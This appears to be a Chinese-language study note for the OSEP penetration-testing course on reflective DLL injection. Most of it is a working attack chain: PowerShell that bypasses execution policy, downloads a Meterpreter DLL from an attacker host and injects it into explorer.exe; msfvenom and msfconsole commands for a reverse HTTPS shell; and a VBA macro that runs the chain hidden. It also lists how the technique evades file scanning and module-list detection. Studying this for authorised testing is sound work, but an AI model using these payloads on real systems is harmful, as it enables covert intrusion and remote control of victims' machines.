---
title: OSEP-06-反射DLL注入
description: '06-进程注入 | 04-反射DLL注入'
pubDate: 2026-01-30T00:00:52+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# 反射 DLL 注入

## 概述

反射 DLL 注入是 DLL 注入的改进版本，可以在不将 DLL 写入磁盘的情况下将其加载到目标进程。

## 与传统 DLL 注入对比

| 方面 | 传统 DLL 注入 | 反射 DLL 注入 |
|------|--------------|--------------|
| 磁盘写入 | 需要 | 不需要 |
| 使用 LoadLibrary | 是 | 否 |
| 模块列表可见 | 是 | 否 |
| 检测难度 | 较易 | 较难 |

## 工作原理

反射 DLL 注入手动实现 LoadLibrary 的功能：

1. 解析 PE 文件头
2. 分配内存
3. 复制节区
4. 处理重定位
5. 解析导入表
6. 调用 DllMain

## 使用 Invoke-ReflectivePEInjection

### 下载 DLL 到内存

```powershell
# 绕过执行策略
PowerShell -Exec Bypass

# 下载 DLL 为字节数组
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')

# 获取目标进程 ID
$procid = (Get-Process -Name explorer).Id
```

### 导入并执行

```powershell
# 导入模块
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

# 执行反射注入
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

## 参数说明

| 参数 | 说明 |
|------|------|
| -PEBytes | DLL 的字节数组 |
| -ProcId | 目标进程 ID |
| -ExeArgs | 可执行文件参数（可选） |

## 两种模式

### 模式 1: 注入到当前进程

```powershell
# 不指定 ProcId，注入到当前 PowerShell 进程
Invoke-ReflectivePEInjection -PEBytes $bytes
```

### 模式 2: 注入到远程进程

```powershell
# 指定 ProcId，注入到目标进程
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

## 完整攻击流程

```powershell
# 1. 启动 PowerShell（绕过执行策略）
PowerShell -Exec Bypass

# 2. 下载 DLL
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')

# 3. 获取目标进程 ID
$procid = (Get-Process -Name explorer).Id

# 4. 导入脚本
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

# 5. 执行注入
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

## 生成 DLL

```bash
# 生成 Meterpreter DLL
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    -f dll -o /var/www/html/met.dll

# 启动 Web 服务器
sudo systemctl start apache2

# 启动监听器
msfconsole -q -x "use exploit/multi/handler; \
    set payload windows/x64/meterpreter/reverse_https; \
    set LHOST 192.168.119.120; \
    set LPORT 443; \
    run"
```

## 常见错误

### VoidFunc 错误

```
VoidFunc couldn't be found in the DLL
```

**说明**: 这是正常的警告，不影响功能

## 优势

1. **无文件落地** - DLL 不写入磁盘
2. **隐蔽性高** - 不出现在模块列表
3. **绕过检测** - 避免文件扫描
4. **灵活性** - 可以注入任何进程

## 限制

1. **复杂性** - 实现比传统方法复杂
2. **兼容性** - 某些 DLL 可能不兼容
3. **检测** - 内存扫描仍可能检测

## 检测规避

反射 DLL 注入的检测点：
- 内存中的 PE 头
- 异常的内存权限
- 未映射的可执行内存

## 与其他技术结合

```powershell
# 从 VBA 宏调用
Sub MyMacro()
    Dim str As String
    str = "powershell -ep bypass -c ""$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll'); $procid = (Get-Process -Name explorer).Id; IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1'); Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"""
    Shell str, vbHide
End Sub
```
